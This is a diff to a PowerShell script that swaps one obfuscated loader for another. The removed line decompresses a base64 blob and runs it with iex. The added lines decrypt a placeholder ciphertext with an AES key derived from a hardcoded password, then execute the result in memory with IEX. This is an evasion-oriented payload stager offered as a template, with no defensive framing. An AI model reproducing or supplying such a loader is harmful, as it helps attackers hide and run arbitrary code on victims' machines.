@@ -1,1 +1,10 @@
-$d=[System.IO.Compression.GzipStream]::new(([System.IO.MemoryStream][Convert]::FromBase64String('H4sIAAAAAAAEAHNg4FHJS0xJjVfIzEtRSCxJ1C9OTUlMS85JTczRy8xLLS5QSMsvUjDUM1RS0PEEAN2mWSofAAAA')),'Decompress');iex([System.Text.Encoding]::UTF8.GetString(&{$r=New-Object IO.StreamReader $d;$r.ReadToEnd()}))
+$p='7Gk#mP9$vL2@xQ5*'
+$k=([System.Security.Cryptography.SHA256]::new()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($p))[0..15]
+$i=[System.Convert]::FromBase64String('IVHERE')
+$c=[System.Convert]::FromBase64String('CTHERE')
+$a=[System.Security.Cryptography.Aes]::Create()
+$a.Key=$k
+$a.IV=$i
+$d=$a.CreateDecryptor()
+$r=$d.TransformFinalBlock($c,0,$c.Length)
+IEX ([System.Text.Encoding]::UTF8.GetString($r))
